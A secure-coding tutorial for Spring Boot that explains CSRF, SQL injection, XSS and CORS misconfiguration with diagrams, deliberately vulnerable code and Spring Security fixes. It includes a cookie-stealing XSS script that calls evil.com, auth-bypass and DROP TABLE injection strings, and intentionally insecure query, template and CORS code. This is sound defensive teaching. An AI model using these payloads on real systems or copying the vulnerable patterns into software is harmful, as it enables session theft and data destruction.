### 1. Different Types of Attacks: CSRF, SQL Injection, XSS, CORS

---

#### 1.1 CSRF (Cross-Site Request Forgery)

**What is CSRF?**

CSRF is an attack where a malicious website tricks a user's browser into making an unwanted request to a different site where the user is already authenticated. The browser automatically includes cookies (session ID) with the request, so the server thinks the request is legitimate.

**How CSRF Works — Diagram**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         CSRF ATTACK FLOW                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. User logs into bank.com (gets session cookie)                       │
│                                                                         │
│  ┌──────────┐     Login OK + Set-Cookie      ┌──────────────────┐      │
│  │  User's   │ ◄──────────────────────────── │   bank.com        │      │
│  │  Browser  │                                │   (Legitimate)    │      │
│  └──────────┘                                 └──────────────────┘      │
│       │                                                                 │
│       │  2. User visits evil.com (in another tab)                       │
│       ▼                                                                 │
│  ┌──────────────────────────────────┐                                   │
│  │         evil.com                  │                                   │
│  │                                   │                                   │
│  │  <form action="bank.com/transfer" │                                   │
│  │   method="POST">                  │                                   │
│  │   <input name="to" value="hacker">│                                   │
│  │   <input name="amount" value="$$$">│                                  │
│  │  </form>                          │                                   │
│  │  <script>form.submit()</script>   │                                   │
│  └──────────────────────────────────┘                                   │
│       │                                                                 │
│       │  3. Browser auto-attaches bank.com cookies!                     │
│       ▼                                                                 │
│  ┌──────────────────┐                                                   │
│  │   bank.com        │  Thinks it's a legitimate transfer request       │
│  │   POST /transfer  │  because the session cookie is valid!            │
│  │   Cookie: sess=abc│                                                   │
│  └──────────────────┘                                                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**Industry Use Case: Online Banking Transfer**

A banking application allows fund transfers via POST. An attacker embeds a hidden form on their website that auto-submits a transfer request to the bank. When an authenticated user visits the attacker's page, their browser sends the request with valid session cookies.

**Vulnerable Code (No CSRF Protection)**

```java
@RestController
public class TransferController {

    @PostMapping("/transfer")
    public ResponseEntity<String> transfer(
            @RequestParam String toAccount,
            @RequestParam BigDecimal amount) {
        // No CSRF token validation — vulnerable!
        bankService.transferFunds(toAccount, amount);
        return ResponseEntity.ok("Transfer successful");
    }
}
```

**Mitigation with Spring Security**

Spring Security enables CSRF protection by default for stateful (session-based) applications. It uses the **Synchronizer Token Pattern**: the server generates a unique CSRF token per session and expects it in every state-changing request.

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                // Stores CSRF token in a cookie readable by JS (for SPA frontends)
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults());

        return http.build();
    }
}
```

**For REST APIs (Stateless / JWT-based): CSRF can be disabled** since there are no cookies to exploit:

```java
@Configuration
@EnableWebSecurity
public class ApiSecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(AbstractHttpConfigurer::disable)  // Safe for stateless JWT-based APIs
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .authorizeHttpRequests(auth -> auth
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2.jwt(Customizer.withDefaults()));

        return http.build();
    }
}
```

**Thymeleaf form (auto-includes CSRF token):**

```html
<form th:action="@{/transfer}" method="post">
    <!-- Spring automatically inserts hidden CSRF token field -->
    <input type="text" name="toAccount" />
    <input type="number" name="amount" />
    <button type="submit">Transfer</button>
</form>
<!-- Rendered HTML will include: -->
<!-- <input type="hidden" name="_csrf" value="random-token-value" /> -->
```

---

#### 1.2 SQL Injection

**What is SQL Injection?**

SQL Injection occurs when an attacker injects malicious SQL code into application queries through user input. This can allow the attacker to read, modify, or delete data, bypass authentication, or even execute system commands.

**How SQL Injection Works — Diagram**

```
┌──────────────────────────────────────────────────────────────────────────┐
│                       SQL INJECTION ATTACK FLOW                         │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Normal Login:                                                           │
│  ┌─────────────┐   username: john       ┌────────────────────┐          │
│  │   Browser    │ ─────────────────────► │    Application     │          │
│  │              │   password: pass123    │                    │          │
│  └─────────────┘                         └────────┬───────────┘          │
│                                                   │                      │
│                    SQL: SELECT * FROM users        │                      │
│                    WHERE username='john'           ▼                      │
│                    AND password='pass123'  ┌──────────────┐              │
│                                           │   Database    │              │
│                    Result: 1 row ✓        └──────────────┘              │
│                                                                          │
│  ─────────────────────────────────────────────────────────────           │
│                                                                          │
│  SQL Injection Attack:                                                   │
│  ┌─────────────┐   username: ' OR 1=1 --  ┌────────────────────┐       │
│  │   Attacker   │ ─────────────────────── │    Application     │        │
│  │              │   password: anything     │                    │        │
│  └─────────────┘                           └────────┬───────────┘       │
│                                                     │                    │
│                    SQL: SELECT * FROM users          │                    │
│                    WHERE username='' OR 1=1 --'      ▼                   │
│                    AND password='anything'   ┌──────────────┐            │
│                                             │   Database    │            │
│                    1=1 is always TRUE!       └──────────────┘            │
│                    -- comments out rest!                                  │
│                    Result: ALL rows returned ✗ (bypass!)                 │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

**Industry Use Case: E-commerce Search**

An e-commerce platform has a product search feature. An attacker inputs `'; DROP TABLE products; --` in the search bar. If the query is built using string concatenation, the database drops the entire products table.

**Vulnerable Code (String Concatenation)**

```java
@Repository
public class ProductRepository {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    // VULNERABLE — DO NOT DO THIS!
    public List<Product> searchProducts(String keyword) {
        String sql = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'";
        // If keyword = "'; DROP TABLE products; --"
        // SQL becomes: SELECT * FROM products WHERE name LIKE '%'; DROP TABLE products; --%'
        return jdbcTemplate.query(sql, new ProductRowMapper());
    }
}
```

**Mitigation 1: Parameterized Queries (JdbcTemplate)**

```java
@Repository
public class ProductRepository {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    // SAFE — Parameterized query
    public List<Product> searchProducts(String keyword) {
        String sql = "SELECT * FROM products WHERE name LIKE ?";
        String safeKeyword = "%" + keyword + "%";
        return jdbcTemplate.query(sql, new ProductRowMapper(), safeKeyword);
    }
}
```

**Mitigation 2: Spring Data JPA (Safe by Default)**

```java
public interface ProductRepository extends JpaRepository<Product, Long> {

    // Spring Data JPA auto-generates parameterized queries
    List<Product> findByNameContainingIgnoreCase(String keyword);

    // Custom JPQL — also safe with named parameters
    @Query("SELECT p FROM Product p WHERE p.name LIKE %:keyword%")
    List<Product> searchByName(@Param("keyword") String keyword);
}
```

**Mitigation 3: JPA Criteria API (Dynamic Queries)**

```java
@Repository
public class ProductSearchDao {

    @PersistenceContext
    private EntityManager em;

    public List<Product> search(String keyword, BigDecimal minPrice) {
        CriteriaBuilder cb = em.getCriteriaBuilder();
        CriteriaQuery<Product> cq = cb.createQuery(Product.class);
        Root<Product> root = cq.from(Product.class);

        List<Predicate> predicates = new ArrayList<>();
        if (keyword != null) {
            predicates.add(cb.like(cb.lower(root.get("name")),
                "%" + keyword.toLowerCase() + "%"));
        }
        if (minPrice != null) {
            predicates.add(cb.greaterThanOrEqualTo(root.get("price"), minPrice));
        }
        cq.where(predicates.toArray(new Predicate[0]));

        return em.createQuery(cq).getResultList();
    }
}
```

**Key Takeaway:** Never concatenate user input into SQL strings. Always use parameterized queries, JPA, or ORM frameworks.

---

#### 1.3 XSS (Cross-Site Scripting)

**What is XSS?**

XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. The script runs in the victim's browser with the same privileges as the legitimate site, enabling cookie theft, session hijacking, and defacement.

**Types of XSS**

```
┌───────────────────────────────────────────────────────────────────────────┐
│                          TYPES OF XSS                                    │
├───────────────────────────────────────────────────────────────────────────┤
│                                                                           │
│  1. STORED XSS (Persistent)                                              │
│  ──────────────────────────                                               │
│  Attacker ──► Saves malicious script in DB ──► Other users load the page │
│               (e.g., forum post, comment)       Script executes in their  │
│                                                 browser automatically     │
│                                                                           │
│  2. REFLECTED XSS (Non-Persistent)                                       │
│  ─────────────────────────────────                                        │
│  Attacker ──► Crafts a malicious URL ──► Victim clicks link              │
│               bank.com/search?q=<script>  Server reflects input back      │
│                                           Script executes once            │
│                                                                           │
│  3. DOM-BASED XSS                                                        │
│  ─────────────────                                                        │
│  Attacker ──► Crafts URL with payload ──► Client-side JS processes it    │
│               page.html#<script>          DOM is modified unsafely         │
│               Never touches server        Script executes in browser      │
│                                                                           │
└───────────────────────────────────────────────────────────────────────────┘
```

**Stored XSS Attack Flow — Diagram**

```
┌───────────────────────────────────────────────────────────────────┐
│                   STORED XSS ATTACK FLOW                         │
├───────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Step 1: Attacker posts malicious comment                        │
│  ┌──────────┐                            ┌──────────────┐        │
│  │ Attacker  │──POST /comment ──────────►│  Web Server   │       │
│  │           │  body: "<script>           │               │       │
│  │           │  fetch('evil.com/steal'    │  Stores in DB │       │
│  │           │  +document.cookie)</script>"│               │       │
│  └──────────┘                            └──────┬───────┘        │
│                                                  │                │
│                                                  ▼                │
│                                          ┌──────────────┐        │
│                                          │   Database    │        │
│                                          │ Stores script │        │
│                                          │ as comment    │        │
│                                          └──────────────┘        │
│                                                                   │
│  Step 2: Victim views the page with comments                     │
│  ┌──────────┐   GET /comments            ┌──────────────┐        │
│  │  Victim   │◄─────────────────────────│  Web Server   │        │
│  │  Browser  │  Response includes:       │  Loads from DB│        │
│  │           │  <script>fetch(...)</script>│              │        │
│  └──────┬───┘                            └──────────────┘        │
│         │                                                         │
│         │  Script executes! Cookies sent to evil.com              │
│         ▼                                                         │
│  ┌──────────────┐                                                │
│  │  evil.com     │  Attacker now has victim's session cookie!     │
│  │  /steal?c=... │                                                │
│  └──────────────┘                                                │
│                                                                   │
└───────────────────────────────────────────────────────────────────┘
```

**Industry Use Case: Social Media Comments**

A social media platform allows users to post comments. An attacker posts a comment containing `<script>` tags. When other users view the post, the script runs in their browsers, stealing session tokens.

**Vulnerable Code (No Output Encoding)**

```java
@Controller
public class CommentController {

    @PostMapping("/comment")
    public String addComment(@RequestParam String content, Model model) {
        commentService.save(content); // Saves raw HTML/JS to DB
        return "redirect:/comments";
    }

    @GetMapping("/comments")
    public String showComments(Model model) {
        model.addAttribute("comments", commentService.findAll());
        return "comments";
    }
}
```

```html
<!-- VULNERABLE Thymeleaf template — renders raw HTML -->
<div th:each="comment : ${comments}">
    <p th:utext="${comment.content}"></p>  <!-- th:utext = unescaped! DANGEROUS -->
</div>
```

**Mitigation: Output Encoding + Content Security Policy**

```html
<!-- SAFE Thymeleaf template — auto-escapes HTML entities -->
<div th:each="comment : ${comments}">
    <p th:text="${comment.content}"></p>  <!-- th:text = auto-escaped. SAFE -->
</div>
<!-- <script>alert('xss')</script> renders as plain text -->
```

**Input Sanitization (Server-Side)**

```java
@RestController
public class CommentController {

    // Use a library like OWASP Java HTML Sanitizer
    private static final PolicyFactory SANITIZER = new HtmlPolicyBuilder()
            .allowElements("b", "i", "u", "p", "br")   // Allow only safe tags
            .allowAttributes("class").onElements("p")
            .toFactory();

    @PostMapping("/api/comments")
    public ResponseEntity<Comment> addComment(@RequestBody @Valid CommentRequest request) {
        String sanitized = SANITIZER.sanitize(request.getContent());
        Comment comment = commentService.save(sanitized);
        return ResponseEntity.ok(comment);
    }
}
```

**Content Security Policy Header in Spring Security**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; script-src 'self'; style-src 'self'")
                    // Blocks inline scripts and external script sources
                )
                .xssProtection(xss -> xss
                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)
                )
                .contentTypeOptions(Customizer.withDefaults()) // X-Content-Type-Options: nosniff
            );

        return http.build();
    }
}
```

---

#### 1.4 CORS (Cross-Origin Resource Sharing)

**What is CORS?**

CORS is a **browser security mechanism** (not an attack itself) that restricts web pages from making requests to a different origin (domain, port, or protocol). Misconfigured CORS policies can become a security vulnerability by allowing unauthorized origins to access your API.

**How CORS Works — Diagram**

```
┌──────────────────────────────────────────────────────────────────────────┐
│                        CORS MECHANISM                                    │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Same-Origin Request (Allowed by default):                               │
│  ┌────────────────┐     GET /api/data     ┌────────────────┐            │
│  │  app.example.com│ ──────────────────── │ app.example.com │            │
│  │  (Frontend)     │ ◄────── 200 OK ──── │ (Backend API)   │            │
│  └────────────────┘                       └────────────────┘            │
│                                                                          │
│  Cross-Origin Request (Blocked without CORS headers):                    │
│  ┌────────────────┐     GET /api/data     ┌────────────────┐            │
│  │  frontend.com   │ ──────────────────── │  api.backend.com│            │
│  │  (Port 3000)    │ ◄── BLOCKED by      │  (Port 8080)    │            │
│  └────────────────┘     browser! ✗        └────────────────┘            │
│                                                                          │
│  ─────────────────────────────────────────────────────────────           │
│                                                                          │
│  Preflight Request (for non-simple requests):                            │
│  ┌────────────────┐                        ┌────────────────┐           │
│  │  frontend.com   │ ── OPTIONS /api/data ─►│  api.backend.com│          │
│  │                 │    Origin: frontend.com│                 │           │
│  │                 │    Access-Control-     │                 │           │
│  │                 │    Request-Method: POST│                 │           │
│  │                 │                        │                 │           │
│  │                 │ ◄─── 200 OK ──────────│                 │           │
│  │                 │    Access-Control-     │                 │           │
│  │                 │    Allow-Origin:       │                 │           │
│  │                 │    frontend.com        │                 │           │
│  │                 │    Access-Control-     │                 │           │
│  │                 │    Allow-Methods: POST │                 │           │
│  │                 │                        │                 │           │
│  │                 │ ── POST /api/data ────►│                 │           │
│  │                 │ ◄─── 200 OK ──────────│                 │           │
│  └────────────────┘                        └────────────────┘           │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

**Industry Use Case: Microservices with Separate Frontend**

A React frontend (localhost:3000) needs to call a Spring Boot API (localhost:8080). Without proper CORS configuration, all cross-origin requests from the frontend are blocked by the browser.

**Misconfigured CORS (Vulnerable)**

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
                .allowedOrigins("*")            // DANGEROUS — allows ANY origin
                .allowedMethods("*")            // DANGEROUS — allows ALL methods
                .allowCredentials(true);         // Allows cookies — combined with * is a vulnerability
    }
}
```

**Proper CORS Configuration**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .authorizeHttpRequests(auth -> auth
                .anyRequest().authenticated()
            );

        return http.build();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();

        // Only allow specific trusted origins
        config.setAllowedOrigins(List.of(
            "https://app.example.com",
            "https://admin.example.com"
        ));

        // Only allow necessary HTTP methods
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));

        // Only allow necessary headers
        config.setAllowedHeaders(List.of("Authorization", "Content-Type"));

        // Allow credentials (cookies, auth headers)
        config.setAllowCredentials(true);

        // Cache preflight response for 1 hour
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }
}
```

**Per-Controller CORS**

```java
@RestController
@RequestMapping("/api/products")
@CrossOrigin(origins = "https://app.example.com", maxAge = 3600)
public class ProductController {

    @GetMapping
    public List<Product> getProducts() {
        return productService.findAll();
    }

    // Override at method level
    @CrossOrigin(origins = "https://admin.example.com")
    @DeleteMapping("/{id}")
    public void deleteProduct(@PathVariable Long id) {
        productService.delete(id);
    }
}
```

---

#### Attack Comparison Summary

```
┌──────────────────┬────────────────────┬─────────────────────┬──────────────────────┐
│     Attack       │     Target         │     Impact          │    Spring Mitigation │
├──────────────────┼────────────────────┼─────────────────────┼──────────────────────┤
│ CSRF             │ Authenticated      │ Unauthorized state  │ CsrfTokenRepository  │
│                  │ user's session     │ changes (transfers, │ Synchronizer Token   │
│                  │                    │ password changes)   │ Pattern              │
├──────────────────┼────────────────────┼─────────────────────┼──────────────────────┤
│ SQL Injection    │ Database layer     │ Data theft, data    │ JPA, Parameterized   │
│                  │                    │ deletion, auth      │ Queries, Criteria    │
│                  │                    │ bypass              │ API                  │
├──────────────────┼────────────────────┼─────────────────────┼──────────────────────┤
│ XSS              │ Client browser     │ Cookie theft,       │ Output encoding,     │
│                  │ (other users)      │ session hijacking,  │ CSP headers,         │
│                  │                    │ defacement          │ HTML Sanitizer       │
├──────────────────┼────────────────────┼─────────────────────┼──────────────────────┤
│ CORS Misconfig   │ API access         │ Unauthorized API    │ CorsConfiguration    │
│                  │ control            │ access from         │ Source, whitelist     │
│                  │                    │ untrusted origins   │ origins              │
└──────────────────┴────────────────────┴─────────────────────┴──────────────────────┘
```

---

